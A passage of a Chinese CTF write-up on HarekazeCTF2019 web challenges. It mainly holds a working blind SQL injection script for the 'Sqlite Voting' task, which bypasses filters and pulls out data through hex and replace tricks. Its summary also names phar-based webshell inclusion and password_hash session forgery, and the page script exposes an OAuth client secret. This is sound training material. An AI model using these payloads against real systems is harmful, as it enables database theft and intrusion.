+<p>在平常做盲注都需要字符截取进行逐位判断，但这里过滤了字符截取函数，可以使用||连接字符</p>
+<p><img src="./1573198578923.png" alt="1573198578923"></p>
+<p>考虑使用replace+length替换substr，逻辑如下,需要知道flag前几个字符,在逐位猜解</p>
+<p><img src="./1573198633285.png" alt="1573198633285"></p>
+<p>但是单引号双引号被过滤，还有能替换的只有hex函数，但是字符拼接0-9无需单引号，但是字符A-Z需要单双引号，可以去数据库中取</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span> <span class="comment"># 'zebra' → '7A65627261'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span> <span class="comment"># 'real' → '7265616C'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span> <span class="comment"># 0xffffffffffffffff = -1 → '2D31'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span> <span class="comment"># 0.1 → 302E31</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span> <span class="comment"># 'dog' → '646F67'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span> <span class="comment"># 'koala' → '6B6F616C61'</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h2><p>参考连接：<a href="https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting" target="_blank" rel="noopener">https://st98.github.io/diary/posts/2019-05-21-harekaze-ctf-2019.html#web-350-sqlite-voting</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">URL = <span class="string">'http://236fd178-f35e-4f3e-88e0-70374086e68c.node3.buuoj.cn/vote.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># フラグの長さを特定</span></span><br><span class="line">l = <span class="number">0</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">  r = requests.post(URL, data=&#123;</span><br><span class="line">    <span class="string">'id'</span>: <span class="string">f'abs(case(length(hex((select(flag)from(flag))))&amp;<span class="subst">&#123;<span class="number">1</span>&lt;&lt;j&#125;</span>)when(0)then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">  &#125;)</span><br><span class="line">  <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">    l |= <span class="number">1</span> &lt;&lt; j</span><br><span class="line">print(<span class="string">'[+] length:'</span>, l)</span><br><span class="line"></span><br><span class="line"><span class="comment"># A-F のテーブルを作成</span></span><br><span class="line">table = &#123;&#125;</span><br><span class="line">table[<span class="string">'A'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'</span></span><br><span class="line">table[<span class="string">'C'</span>] = <span class="string">'trim(hex(typeof(.1)),12567)'</span></span><br><span class="line">table[<span class="string">'D'</span>] = <span class="string">'trim(hex(0xffffffffffffffff),123)'</span></span><br><span class="line">table[<span class="string">'E'</span>] = <span class="string">'trim(hex(0.1),1230)'</span></span><br><span class="line">table[<span class="string">'F'</span>] = <span class="string">'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'</span></span><br><span class="line">table[<span class="string">'B'</span>] = <span class="string">f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||<span class="subst">&#123;table[<span class="string">"C"</span>]&#125;</span>||<span class="subst">&#123;table[<span class="string">"F"</span>]&#125;</span>)'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># フラグをゲット!</span></span><br><span class="line">res = binascii.hexlify(<span class="string">b'flag&#123;'</span>).decode().upper()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res), l):</span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> <span class="string">'0123456789ABCDEF'</span>:</span><br><span class="line">    t = <span class="string">'||'</span>.join(c <span class="keyword">if</span> c <span class="keyword">in</span> <span class="string">'0123456789'</span> <span class="keyword">else</span> table[c] <span class="keyword">for</span> c <span class="keyword">in</span> res + x)</span><br><span class="line">    print(t)</span><br><span class="line">    r = requests.post(URL, data=&#123;</span><br><span class="line">      <span class="string">'id'</span>: <span class="string">f'abs(case(replace(length(replace(hex((select(flag)from(flag))),<span class="subst">&#123;t&#125;</span>,trim(0,0))),<span class="subst">&#123;l&#125;</span>,trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b'An error occurred'</span> <span class="keyword">in</span> r.content:</span><br><span class="line">      res += x</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">  print(<span class="string">f'[+] flag (<span class="subst">&#123;i&#125;</span>/<span class="subst">&#123;l&#125;</span>): <span class="subst">&#123;res&#125;</span>'</span>)</span><br><span class="line">  i += <span class="number">1</span></span><br><span class="line">print(<span class="string">'[+] flag:'</span>, binascii.unhexlify(res).decode())</span><br></pre></td></tr></table></figure>
+
+<p>还有一个解是利用max函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">假设前几位为flag&#123; &#x3D;&gt; hex(&#39;flag&#123;&#125;&#39;) &#x3D;&gt;666C61677B &#x3D;&gt; 之后在拼接上0*剩余flag长度&#x3D;&gt;在用max函数逐位去比较</span><br><span class="line">逻辑如下</span><br><span class="line">abs(ifnull(nullif(max(hex(hex((SELECT(flag)from(flag)))),$NUMBER$),$NUMBER$),0x8000000000000000))</span><br></pre></td></tr></table></figure>
+
+<p>链接：<a href="https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72#solution" target="_blank" rel="noopener">https://gist.github.com/terjanq/a571826c6bb08ae0dfa4ef57e03b5b72#solution</a></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ol>
+<li>盲注过滤字符截取考虑replace+length、max等其他逻辑，不要拘泥字符穿截取函数</li>
+<li>字符串编码和过滤函数不正确放置，能绕过限制</li>
+<li>phar包不仅仅可以反序列化，在phar中放入文件，phar://uploads/xxx.phar(png)/exp.css，在exp.css放入一句话木马，使用inlude触发，可以执行代码</li>
+<li>getimagesieze与finfo_file判断图片类型有差异，finfo_file可以识别第一行图片类型，getimagesize无法识别</li>
+<li>在审计一道题目时候，先分析出漏洞点，在考虑其他方面</li>
+<li>password_hash只对前72字符加密，由于截取字符的缘故，造成session伪造</li>
+<li>sqlite3中<code>||</code> 可以起到字符拼接的作用</li>
+</ol>
+</section>
+    <!-- Tags START -->
+    
+      <div class="tags">
+        <span>Tags:</span>
+        
+  <a href="/tags#CTF" >
+    <span class="tag-code">CTF</span>
+  </a>
+
+      </div>
+    
+    <!-- Tags END -->
+    <!-- NAV START -->
+    
+  <div class="nav-container">
+    <!-- reverse left and right to put prev and next in a more logic postition -->
+    
+      <a class="nav-left" href="/2019/11/04/%E5%AF%B9%E7%8E%B0%E4%BB%A3WEB%E6%A1%86%E6%9E%B6-CMS%E5%AE%A1%E8%AE%A1%E6%80%9D%E8%80%83/">
+        <span class="nav-arrow">← </span>
+        
+          对现代WEB框架/CMS审计思考
+        
+      </a>
+    
+    
+      <a class="nav-right" href="/2019/11/12/2019%E6%B9%96%E6%B9%98%E6%9D%AFweb%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">
+        
+          2019湖湘杯web部分题解
+        
+        <span class="nav-arrow"> →</span>
+      </a>
+    
+  </div>
+
+    <!-- NAV END -->
+    <!-- 打赏 START -->
+    
+      <div class="money-like">
+        <div class="reward-btn">
+          赏
+          <span class="money-code">
+            <span class="alipay-code">
+              <div class="code-image"></div>
+              <b>使用支付宝打赏</b>
+            </span>
+            <span class="wechat-code">
+              <div class="code-image"></div>
+              <b>使用微信打赏</b>
+            </span>
+          </span>
+        </div>
+        <p class="notice">若你觉得我的文章对你有帮助，欢迎点击上方按钮对我打赏</p>
+      </div>
+    
+    <!-- 打赏 END -->
+    <!-- 二维码 START -->
+    
+    <!-- 二维码 END -->
+    
+      <!-- Gitment START -->
+      <div id="comments"></div>
+      <!-- Gitment END -->
+    
+  </article>
+  <!-- Article END -->
+  <!-- Catalog START -->
+  
+    <aside class="catalog-container">
+  <div class="toc-main">
+    <strong class="toc-title">Catalog</strong>
+    
+      <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#前言"><span class="toc-nav-text">前言</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#encode-and-encode"><span class="toc-nav-text">encode_and_encode</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#easy-notes"><span class="toc-nav-text">easy_notes</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#HarekazeCTF2019-Avatar-Uploader-1"><span class="toc-nav-text">[HarekazeCTF2019]Avatar Uploader 1</span></a></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#HarekazeCTF2019-Avatar-Uploader-2"><span class="toc-nav-text">[HarekazeCTF2019]Avatar Uploader 2</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#利用"><span class="toc-nav-text">利用</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#Sqlite-Voting"><span class="toc-nav-text">Sqlite Voting</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#利用-1"><span class="toc-nav-text">利用</span></a></li></ol></li><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#总结"><span class="toc-nav-text">总结</span></a></li></ol>
+    
+  </div>
+</aside>
+  
+  <!-- Catalog END -->
+</main>
+
+<script>
+  (function () {
+    var url = 'http://zhzhdoai.github.io/2019/11/08/HarekazeCTF2019-WEB题解/';
+    var banner = ''
+    if (banner !== '' && banner !== 'undefined' && banner !== 'null') {
+      $('#article-banner').css({
+        'background-image': 'url(' + banner + ')'
+      })
+    } else {
+      $('#article-banner').geopattern(url)
+    }
+    $('.header').removeClass('fixed-header')
+
+    // error image
+    $(".markdown-content img").on('error', function() {
+      $(this).attr('src', 'http://file.muyutech.com/error-img.png')
+      $(this).css({
+        'cursor': 'default'
+      })
+    })
+
+    // zoom image
+    $(".markdown-content img").on('click', function() {
+      var src = $(this).attr('src')
+      if (src !== 'http://file.muyutech.com/error-img.png') {
+        var imageW = $(this).width()
+        var imageH = $(this).height()
+
+        var zoom = ($(window).width() * 0.95 / imageW).toFixed(2)
+        zoom = zoom < 1 ? 1 : zoom
+        zoom = zoom > 2 ? 2 : zoom
+        var transY = (($(window).height() - imageH) / 2).toFixed(2)
+
+        $('body').append('<div class="image-view-wrap"><div class="image-view-inner"><img src="'+ src +'" /></div></div>')
+        $('.image-view-wrap').addClass('wrap-active')
+        $('.image-view-wrap img').css({
+          'width': `${imageW}`,
+          'transform': `translate3d(0, ${transY}px, 0) scale3d(${zoom}, ${zoom}, 1)`
+        })
+        $('html').css('overflow', 'hidden')
+
+        $('.image-view-wrap').on('click', function() {
+          $(this).remove()
+          $('html').attr('style', '')
+        })
+      }
+    })
+  })();
+</script>
+
+
+
+
+  <script>
+    var gitmentConfig = "osword";
+    if (gitmentConfig !== 'undefined') {
+      var gitment = new Gitment({
+        id: "HarekazeCTF2019 | WEB题解",
+        owner: "osword",
+        repo: "osword.github.io",
+        oauth: {
+          client_id: "7d7576c71632f14d639a",
+          client_secret: "3d7f7e4c0e9a43a2cc5334d68aee612090df8b70"
+        },
+        theme: {
+          render(state, instance) {
+            const container = document.createElement('div')
+            container.lang = "en-US"
+            container.className = 'gitment-container gitment-root-container'
+            container.appendChild(instance.renderHeader(state, instance))
+            container.appendChild(instance.renderEditor(state, instance))
+            container.appendChild(instance.renderComments(state, instance))
+            container.appendChild(instance.renderFooter(state, instance))
+            return container;
+          }
+        }
+      })
+      gitment.render(document.getElementById('comments'))
+    }
+  </script>
+
+
+
+
+    <div class="scroll-top">
+  <span class="arrow-icon"></span>
+</div>
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<footer class="app-footer">
+  <p class="copyright">
+    &copy; 2020 | Proudly powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+    <br>
+    Theme by <a href="https://github.com/yanm1ng" target="_blank" rel="noopener">yanm1ng</a>
+  </p>
+    访问量<span id="busuanzi_value_site_pv"></span>,
+    访客数<span id="busuanzi_value_site_uv"></span>
+</footer>
+
+<script>
+  function async(u, c) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+</script>
+<script>
+  async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+    FastClick.attach(document.body);
+  })
+</script>
+
+<script>
+  var hasLine = 'true';
+  async("//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js", function(){
+    $('figure pre').each(function(i, block) {
+      var figure = $(this).parents('figure');
+      if (hasLine === 'false') {
+        figure.find('.gutter').hide();
+      }
+      var lang = figure.attr('class').split(' ')[1] || 'code';
+      var codeHtml = $(this).html();
+      var codeTag = document.createElement('code');
+      codeTag.className = lang;
+      codeTag.innerHTML = codeHtml;
+      $(this).attr('class', '').empty().html(codeTag);
+      figure.attr('data-lang', lang.toUpperCase());
+      hljs.highlightBlock(block);
+    });
+  })
+</script>
+<!-- Baidu Tongji -->
+
+
+<script src="/js/script.js"></script>
+
+
+  </body>
+</html>
